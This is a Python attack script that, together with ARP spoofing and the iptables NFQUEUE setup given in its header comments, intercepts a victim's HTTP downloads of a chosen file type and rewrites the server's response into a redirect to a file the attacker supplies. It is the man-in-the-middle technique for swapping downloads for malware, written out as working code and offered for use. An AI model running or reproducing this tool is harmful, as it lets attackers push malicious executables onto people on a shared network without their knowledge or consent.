#!/usr/bin/env python
# Description: This program replaces the download of a specific file format (download_format) with a malicious_file.
#
# sudo pip install netfilterqueue               --> Install netfilterqueue
# echo 1 > /proc/sys/net/ipv4/ip_forward        --> Ip forwarding 
# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> For mitm. Trap all the packets that usually goes to the forward chain if it is are in the netfilter queue with queue number 0.
# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> Use this and the next command instead if we are testing it in our own computer.
# iptables -I INPUT -j NFQUEUE --queue-num 0    
# python arp_spoof.py -t <target's ip> -s <router's ip>     --> Arp poisoning for mitm.
# (iptables --flush                             --> back to normal)
#
# Usage:  python replace_downloads.py -d <download_format> -m <malicious_file>
# Usage: python3 replace_downloads.py -d <download_format> -m <malicious_file>
import argparse
import netfilterqueue
import scapy.all as scapy
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--download_format", dest="download_format", help="For example .exe")
    parser.add_argument("-m", "--malicious_file", dest="malicious_file", help="For example https://ichef.bbci.co.uk/news/640/cpsprodpb/150EA/production/_107005268_gettyimages-611696954.jpg")
    options = parser.parse_args()
    if not options.download_format:
        parser.error("[-] Please specify the format file of the download, use --help for more info.")
    elif not options.malicious_file:
        parser.error("[-] Please specify a malicious file, use --help for more info.")
    return options


def set_load(packet, malicious_file):
    load = "HTTP/1.1 301 Moved Permanently\nLocation:" + malicious_file +"\n\n"
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
 
 
def process_packet(packet):
    # Converting packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):      
        if scapy_packet[scapy.TCP].dport == 80:     # Request
            #If ".exe" in str(scapy_packet[scapy.Raw].load):        python3
            #When using sslstrip, be careful not to be in a loop if using .exe malicious file:
            #If download_format in scapy_packet[scapy.Raw].load and "ichef.bbci.co.uk" not in scapy_packet[scapy.Raw].load:
            if download_format in scapy_packet[scapy.Raw].load:
                print("[+] Attemp to download file "+ download_format +" format.")
                ack_list.append(scapy_packet[scapy.TCP].ack)        
        elif scapy_packet[scapy.TCP].sport == 80:   # Response
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file changing the packet load with the redirection and removing data.")
                modified_packet = set_load(scapy_packet, malicious_file)
                packet.set_payload(str(modified_packet))
                #packet.set_payload(bytes(modified_packet))     python3
    packet.accept()


def main():
    global download_format
    global malicious_file
    global ack_list
    
    ack_list = []
    options = get_arguments()
    download_format = options.download_format
    malicious_file = options.malicious_file

    try:    
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C -> Quitting")
        sys.exit(0)


if __name__ == "__main__":
    main()